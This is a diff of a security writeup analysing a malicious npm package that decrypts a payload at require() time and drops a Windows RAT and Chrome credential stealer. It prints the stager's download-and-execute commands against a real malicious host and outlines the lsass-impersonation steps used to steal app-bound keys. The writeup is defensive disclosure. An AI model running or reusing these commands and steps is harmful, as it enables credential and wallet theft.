@@ -6,7 +6,7 @@ packageName: aes-decode-runner-pro
 ecosystem: npm
 ---
 
-`abdrizak <aabdirizak13@gmail.com>` registered `aes-decode-runner-pro` on 2026-05-25 and walked the version from `1.0.1` to `1.0.10` in 24 hours. The description (`Layered custom codec pipeline with position-unit-codec, encode-decode-codec, and AES-GCM.`) and the `aes` / `aes-gcm` / `decode` / `codec` / `encryption` keyword list dress it up as a tutorial library, and the two declared deps — `position-unit-codec` and `encode-decode-codec`, both real, harmless packages by another publisher — supply the outer layers of the codec pipeline so the AES math actually works. Importing the package fires the chain immediately:
+Dressed up as an AES-GCM tutorial library — two real codec deps wired in so the math actually works — `aes-decode-runner-pro` fires its chain the moment you `require()` it:
 
 <pre class="lang-js"><code><span class="tok-com">// index.js</span>
 <span class="tok-kw">const</span> pkg = <span class="tok-builtin">require</span>(<span class="tok-str">"./custom-codec"</span>);
@@ -14,7 +14,7 @@ pkg.<span class="tok-fn">run</span>();
 module.exports = pkg;
 </code></pre>
 
-`run` is `runDefaultDecodedFunction` from `src/pipeline/custom-codec-pipeline.js`. It pulls a 6 KB AES-GCM ciphertext and key material out of `src/config/defaults.js`:
+`run` pulls a 6 KB AES-GCM ciphertext and key material out of `defaults.js`:
 
 | Variable | Value |
 | --- | --- |
@@ -23,13 +23,11 @@ module.exports = pkg;
 | Salt | `encode-npm-c-salt` |
 | KDF | scrypt |
 
-The decoded plaintext comes out of three reversed codec layers:
+then peels three reversed codec layers and hands the plaintext to `new Function("require", runnable)(require)` — `eval` with one indirection, so a static reader's eye slides off it.
 
-1. `aes-256-gcm`
-2. `encode-decode-codec`
-3. `position-unit-codec`
-
-The result is handed to `new Function("require", runnable)(require)` — `eval` with one indirection, so the static reader's eye slides off it.
+- `aes-256-gcm`
+- `encode-decode-codec`
+- `position-unit-codec`
 
 The decrypted JS is a self-deleting PowerShell stager:
 
@@ -41,14 +39,14 @@ fs.<span class="tok-fn">writeFileSync</span>(<span class="tok-str">"settings.ps1
   .<span class="tok-fn">on</span>(<span class="tok-str">"exit"</span>, () =&gt; fs.<span class="tok-fn">unlinkSync</span>(<span class="tok-str">"settings.ps1"</span>));
 </code></pre>
 
-Three lines come out the other end:
+Its three operative lines:
 
 <pre class="lang-ps1"><code>curl.exe -k -o "$env:TEMP\winPatch.zip" http://nvidiadriver.net/verv1432/winpatch-bd9e.win
 Expand-Archive -Force -Path "$env:TEMP\winPatch.zip" -DestinationPath "$env:TEMP\winPatch"
 wscript "$env:TEMP\winPatch\update.vbs"
 </code></pre>
 
-`nvidiadriver.net` (Hetzner `95.216.92.207`) serves the payload as a 6 MB store-compressed zip behind an Express front-end with full helmet, CSP, and HSTS headers — the kind of dropper infrastructure you stand up once and reuse. The response advertises `Content-Disposition: attachment; filename="win-driver-bd9e.zip"`. Inside is a complete CPython 3.10 runtime alongside three Nuitka-compiled `.pyd` modules:
+The 6 MB zip ships a complete CPython 3.10 runtime plus three Nuitka-compiled `.pyd` modules whose compressed constants hide the C2 URL — yet `cleave analyze` still fires twelve `winpatch` rules off the leftover Unicode constant table:
 
 - `chost.exe` — `python.exe` unmodified, PDB `D:\_w\1\b\bin\amd64\python.pdb`, PSF cert intact
 - Three `.pyd` modules — confirmed Nuitka by their constants:
@@ -56,9 +54,7 @@ wscript "$env:TEMP\winPatch\update.vbs"
   - `__compiled__`
   - `PyMarshal_ReadObjectFromString`
 
-Nuitka's compressed constants hide the C2 URL itself, but `cleave analyze` on the three modules fires twelve `well-known/malware/rat/winpatch::*` rules at once — campaign tag, transport, six command verbs, the Chrome-cookie task, the dump-file banner and filename, and two typo-fingerprint rules unique to the family. The Unicode constant table in `.rdata` shows why each one matched:
-
-**`audiodriver.cp310-win_amd64.pyd` — the RAT dispatcher.** It opens a session to its server, fingerprints the host, and dispatches commands one at a time; persistence is a single `HKCU\…\Run` write pointing at the VBS the dropper just executed. Every transport, helper, and command constant carries the `0825` campaign tag:
+**`audiodriver.cp310-win_amd64.pyd` — the RAT dispatcher**, every constant stamped with the `0825` campaign tag:
 
 | Constant | Role |
 | --- | --- |
@@ -69,7 +65,7 @@ Nuitka's compressed constants hide the C2 URL itself, but `cleave analyze` on th
 | `COMMAND0825{AUTO,EXIT,INFORMATION,TERMINAL,FILE_UPLOAD,FILE_DOWNLOAD,WAIT}` | seven verbs, dispatched to matching `process0825*` handlers |
 | `AUTO0825CHROME_COOKIE` | parameter passed to `auto.pyd` when `COMMAND0825AUTO` fires |
 
-**`api.cp310-win_amd64.pyd` — the `htxp` transport.** Cleave matches `winpatch::campaign-htxp-exchange` on the exported `htxp0825Exchange`, and the surrounding constants in `.rsrc` spell out the wire format: ARC4-encrypted body plus an MD5 checksum, POSTed as `application/octet-stream` to whatever URL `audiodriver` passes in.
+**`api.cp310-win_amd64.pyd` — the `htxp` transport**, an ARC4-encrypted, MD5-checksummed body POSTed as `application/octet-stream`:
 
 | Constant | Role |
 | --- | --- |
@@ -79,7 +75,7 @@ Nuitka's compressed constants hide the C2 URL itself, but `cleave analyze` on th
 | `requests.post`, `Content-Type: application/octet-stream` | HTTP carrier |
 | `urandom`, `KEY_LENGTH` | per-session ARC4 key |
 
-**`auto.cp310-win_amd64.pyd` — the Chrome ABE stealer.** This is the part most npm-dropped Windows stealers skip: Chrome's app-bound encryption binds the v20 key to a SYSTEM-only DPAPI scope, and `auto.pyd` pays the cost of getting there. The escalation chain:
+**`auto.cp310-win_amd64.pyd` — the Chrome ABE stealer**, the part most npm-dropped stealers skip: to reach the SYSTEM-scoped v20 app-bound key it impersonates `lsass.exe`, then decrypts three browser stores and hands the loot back over `htxp`.
 
 1. Enable `SeDebugPrivilege`
 2. Open `lsass.exe`
@@ -87,13 +83,9 @@ Nuitka's compressed constants hide the C2 URL itself, but `cleave analyze` on th
 4. Call `NCryptOpenKey("Google Chromekey1")` under that impersonation
 5. Use the returned key to unwrap `app_bound_encrypted_key` from `Local State`
 
-Two cleave rules confirm the full chain: `winpatch::winpatch-chrome-stealer` matches on five module-unique strings together, and `credential-access/browser/chromium::chromium-app-bound-key-theft-binary` matches the ABE primitives. The recovered key decrypts three browser stores:
-
 - `Login Data` (saved-logins SQLite)
 - the cookie database
 - `Local Extension Settings` (where browser-wallet extensions live)
-
-Results are bannered `Chrome Saved Logins Dump` and written to `chrome_logins_dump.txt`. `audiodriver` uploads them over `htxp`.
 
 | Constant | Role |
 | --- | --- |
@@ -106,7 +98,7 @@ Results are bannered `Chrome Saved Logins Dump` and written to `chrome_logins_du
 | `aautoCookieMode`, `aautoGatherMode`, `azipDirectories` | cookies + `Local Extension Settings` (wallets) packaged |
 | `uchrome_logins_dump.txt`, `uChrome Saved Logins Dump` | output filename + banner |
 
-Winpatch's prior detonations all rode the usual delivery surfaces — cracked-software lures, fake installers, phishing. Watching its `0825` campaign tooling ride the npm registry instead — wrapped in an AES-GCM "tutorial library" that detonates at `require()` time — is the new bit, and the part that should generalize: a small JavaScript front-end is now a more comfortable place to hide a Windows native stealer than any of the channels its operators were using two months ago.
+Winpatch used to arrive via cracked-software lures and fake installers; seeing its `0825` tooling ride npm instead means a small JavaScript front-end is now a comfortable enough place to hide a Windows native stealer.
 
 ## Traits observed
 
